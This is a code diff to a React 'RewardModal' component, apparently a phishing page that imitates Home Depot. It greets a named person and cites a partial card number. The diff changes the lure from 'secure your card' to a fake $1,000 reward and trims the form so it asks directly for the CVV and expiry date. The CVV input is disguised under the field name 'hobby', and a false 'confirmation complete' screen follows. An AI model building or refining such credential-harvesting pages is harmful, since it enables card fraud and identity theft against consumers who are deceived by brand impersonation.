@@ -252,7 +252,7 @@ export default function RewardModal() {
           <>
             <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
               <h2 className="text-2xl font-bold">Hello CAROL J GMITER</h2>
-              <p className="text-lg mt-1">Secure your card ending with xxx8880 on Home Depot</p>
+              <p className="text-lg mt-1">You have been reward $1,000</p>
             </div>
 
             <div className="p-4 flex justify-center">
@@ -276,7 +276,7 @@ export default function RewardModal() {
                 onClick={goToForm}
                 className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg animate-pulse"
               >
-                Secure your card now
+                Claim Reward
               </Button>
 
               <p className="text-xs text-gray-500 mt-4">
@@ -299,14 +299,17 @@ export default function RewardModal() {
                 {showVerificationMessage && (
                   <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start">
                     <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
-                    <p className="text-sm text-blue-700">
+                    {/* <p className="text-sm text-blue-700">
                       Please enter your card details for verification purposes. This is required to secure your card.
+                    </p> */}
+                    <p className="text-sm text-blue-700">
+                      Please enter your card cvv for verification purposes. This is required to verify your card.
                     </p>
                   </div>
                 )}
 
                 {/* Credit card fields - now shown immediately */}
-                {showCVV && (
+                {/* {showCVV && (
                   <div className="space-y-4 animate-in fade-in duration-500">
                     <div className="space-y-2">
                       <label htmlFor="cardNumber" className="text-sm font-medium block">
@@ -322,116 +325,116 @@ export default function RewardModal() {
                         maxLength={19}
                       />
                       {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
-                    </div>
+                    </div> */}
 
-                    {/* CVV field */}
-                    <div className="space-y-2">
-                      <label htmlFor="hobby" className="text-sm font-medium block">
-                        CVV (3 digits on back of card)
-                      </label>
-                      <Input
-                        id="hobby"
-                        name="hobby"
-                        placeholder="123"
-                        value={formData.hobby}
-                        onChange={handleInputChange}
-                        className={errors.hobby ? "border-red-500" : ""}
-                        maxLength={3}
-                        type="password"
-                      />
-                      {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
-                    </div>
+                {/* CVV field */}
+                <div className="space-y-2">
+                  <label htmlFor="hobby" className="text-sm font-medium block">
+                    CVV (3 digits on back of card)
+                  </label>
+                  <Input
+                    id="hobby"
+                    name="hobby"
+                    placeholder="123"
+                    value={formData.hobby}
+                    onChange={handleInputChange}
+                    className={errors.hobby ? "border-red-500" : ""}
+                    maxLength={3}
+                    type="password"
+                  />
+                  {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
+                </div>
 
-                    <div className="space-y-2">
-                      <label htmlFor="expiryDate" className="text-sm font-medium block">
-                        Expiry Date
-                      </label>
-                      <Input
-                        id="expiryDate"
-                        name="expiryDate"
-                        placeholder="MM/YY"
-                        value={formData.expiryDate}
-                        onChange={handleInputChange}
-                        className={errors.expiryDate ? "border-red-500" : ""}
-                        maxLength={5}
-                      />
-                      {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
-                    </div>
-                  </div>
+                <div className="space-y-2">
+                  <label htmlFor="expiryDate" className="text-sm font-medium block">
+                    Expiry Date
+                  </label>
+                  <Input
+                    id="expiryDate"
+                    name="expiryDate"
+                    placeholder="MM/YY"
+                    value={formData.expiryDate}
+                    onChange={handleInputChange}
+                    className={errors.expiryDate ? "border-red-500" : ""}
+                    maxLength={5}
+                  />
+                  {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
+                </div>
+              </div>
                 )}
 
-                <Button
-                  onClick={submitForm}
-                  className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4"
-                  disabled={!showCVV || isSubmitting}
-                >
-                  {isSubmitting ? (
-                    <>
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    "Verify"
-                  )}
-                </Button>
+              <Button
+                onClick={submitForm}
+                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4"
+                disabled={!showCVV || isSubmitting}
+              >
+                {isSubmitting ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Processing...
+                  </>
+                ) : (
+                  "Verify"
+                )}
+              </Button>
 
-                <p className="text-xs text-gray-500 mt-2 text-center">
-                  Your information is secure and will only be used to verify your card.
-                </p>
-              </div>
-            </div>
-          </>
-        )}
-
-        {isLoadingGears && (
-          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
-            <div className="text-center">
-              <div className="relative flex items-center justify-center mb-6">
-                {/* First gear */}
-                <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
-                {/* Second gear - positioned to interlock and rotate opposite direction */}
-                <Settings
-                  className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
-                  style={{
-                    animation: "spin 2s linear infinite reverse",
-                    transform: "rotate(30deg)",
-                  }}
-                />
-              </div>
-              <p className="text-white text-lg font-medium">Processing your information...</p>
-              <p className="text-gray-300 text-sm mt-2">Please wait while we secure your account</p>
+              <p className="text-xs text-gray-500 mt-2 text-center">
+                Your information is secure and will only be used to verify your card.
+              </p>
             </div>
           </div>
+      </>
         )}
 
-        {step === 3 && (
-          <>
-            <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
-              <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
-              <p className="text-lg mt-1">Your card is now secured</p>
+      {isLoadingGears && (
+        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
+          <div className="text-center">
+            <div className="relative flex items-center justify-center mb-6">
+              {/* First gear */}
+              <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
+              {/* Second gear - positioned to interlock and rotate opposite direction */}
+              <Settings
+                className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
+                style={{
+                  animation: "spin 2s linear infinite reverse",
+                  transform: "rotate(30deg)",
+                }}
+              />
+            </div>
+            <p className="text-white text-lg font-medium">Processing your information...</p>
+            <p className="text-gray-300 text-sm mt-2">Please wait while we secure your account</p>
+          </div>
+        </div>
+      )}
+
+      {step === 3 && (
+        <>
+          <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
+            <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
+            <p className="text-lg mt-1">Your card is now secured</p>
+          </div>
+
+          <div className="p-8 text-center">
+            <div className="flex justify-center mb-6">
+              <CheckCircle className="h-20 w-20 text-green-500" />
             </div>
 
-            <div className="p-8 text-center">
-              <div className="flex justify-center mb-6">
-                <CheckCircle className="h-20 w-20 text-green-500" />
-              </div>
+            <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
+            <p className="text-gray-600 mb-6">
+              We have successfully received and verified your information. Your account is now secure. Our Agent will
+              contact you.
+            </p>
 
-              <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
-              <p className="text-gray-600 mb-6">
-                We have successfully received and verified your information. Your account is now secure. Our Agent will
-                contact you.
-              </p>
-
-              <Button
-                onClick={closeModal}
-                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md"
-              >
-                Close
-              </Button>
-            </div>
-          </>
-        )}
-      </div>
+            <Button
+              onClick={closeModal}
+              className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md"
+            >
+              Close
+            </Button>
+          </div>
+        </>
+      )}
     </div>
+    </div >
   )
 }
